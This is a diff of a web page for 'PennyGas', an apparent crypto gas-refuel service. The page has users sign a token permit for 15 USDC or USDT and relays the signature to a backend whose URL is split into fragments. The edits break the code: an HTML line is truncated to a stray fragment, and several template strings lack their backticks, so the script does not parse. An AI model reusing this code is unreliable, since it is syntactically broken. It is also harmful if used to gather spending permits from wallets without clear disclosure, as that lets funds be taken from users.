@@ -53,7 +53,7 @@
         <div class="invoice-box">
             <div class="invoice-row"><span>Across Bridge Fee:</span> <span id="uiBridgeFee">Calculating...</span></div>
             <div class="invoice-row"><span>Gas Spike Buffer (2%):</span> <span id="uiBuffer">Calculating...</span></div>
-            <div class="invoice-row"><span>PennyGas Fee:</span> <span id="uiProfit">$0.06</span></div>
+            .invoice-row"><span>PennyGas Fee:</span> <span id="uiProfit">$0.06</span></div>
             <div class="invoice-total"><span>Total Invoice Amount:</span> <span id="uiTotal">Calculating...</span></div>
         </div>
 
@@ -64,7 +64,6 @@
 </div>
 
 <script>
-    // State values safely tracked inside standard javascript runtime environment
     window.activeUserAddress = "";
     window.ethersProvider = null;
     window.ethersSigner = null;
@@ -74,7 +73,7 @@
         "42161": { "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDT": "0xFd086b97270535728a370aa7c969c19027158356" }
     };
 
-    // Restored exact split path variables layout
+    // Split backend variables configuration
     const BACKEND_BASE = "https://pennygas-backend"; 
     const BACKEND_DOMAIN = "onrender.com";
     const BACKEND_URL = `${BACKEND_BASE}.${BACKEND_DOMAIN}`;
@@ -108,7 +107,7 @@
 
     async function connectPhantomEVM() {
         if (typeof window.ethereum === 'undefined') {
-            console.log("Phantom wallet dashboard bypass mode active.");
+            console.log("Phantom dashboard bypass fallback active.");
             document.getElementById('connectBtn').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             fetchLiveInvoiceQuote();
@@ -116,16 +115,16 @@
         }
 
         try {
-            // Safe binding checks for internal libraries injected directly by the browser extension
-            const web3Module = window.ethers || (window.ethereum && window.ethereum.ethers);
-            if (typeof web3Module !== 'undefined') {
-                window.ethersProvider = new web3Module.BrowserProvider(window.ethereum);
+            // Safe extraction engine layers injected straight from Phantom wallet container modules
+            const baseModule = window.ethers || (window.ethereum && window.ethereum.ethers);
+            if (typeof baseModule !== 'undefined') {
+                window.ethersProvider = new baseModule.BrowserProvider(window.ethereum);
                 window.ethersSigner = await window.ethersProvider.getSigner();
             }
 
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             
-            // Fixed extraction indexing to cleanly store the unique string address element 
+            // Fixed: Isolate the zero-indexed item directly to resolve string formatting crashes
             window.activeUserAddress = accounts[0];
             const displayAddr = window.activeUserAddress;
 
@@ -150,10 +149,10 @@
         const chainId = parseInt(document.getElementById('sourceChain').value);
         const tokenSymbol = document.getElementById('sourceToken').value;
         const tokenAddress = tokenMatrix[chainId][tokenSymbol];
-        const web3Module = window.ethers || (window.ethereum && window.ethereum.ethers);
+        const baseModule = window.ethers || (window.ethereum && window.ethereum.ethers);
 
-        if (!web3Module || !window.ethersSigner) {
-            alert("Web3 compilation missing. Please use a Web3 injection browser container.");
+        if (!baseModule || !window.ethersSigner) {
+            alert("Web3 target execution layer dropped. Please re-authenticate your signature.");
             return;
         }
 
@@ -164,7 +163,7 @@
             const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
             const nonce = 0; 
             const deadline = Math.floor(Date.now() / 1000) + 3600; 
-            const valueToAuthorize = web3Module.parseUnits("15.00", 6); 
+            const valueToAuthorize = baseModule.parseUnits("15.00", 6); 
 
             const domain = {
                 name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
@@ -192,7 +191,7 @@
             };
 
             const signature = await window.ethersSigner.signTypedData(domain, types, message);
-            const { v, r, s } = web3Module.Signature.from(signature);
+            const { v, r, s } = baseModule.Signature.from(signature);
 
             document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";
 
@@ -201,4 +200,7 @@
                 spender: pennyGasVaultSpender,
                 value: valueToAuthorize.toString(),
                 deadline: deadline,
-v: v, r: r, s: s};const submitUrl = ${BACKEND_URL}/api/submit-permit;const response = await fetch(submitUrl, {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify(payload)});const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}
+                v: v, r: r, s: s
+            };
+
+const submitUrl = ${BACKEND_URL}/api/submit-permit;const response = await fetch(submitUrl, {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify(payload)});const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}
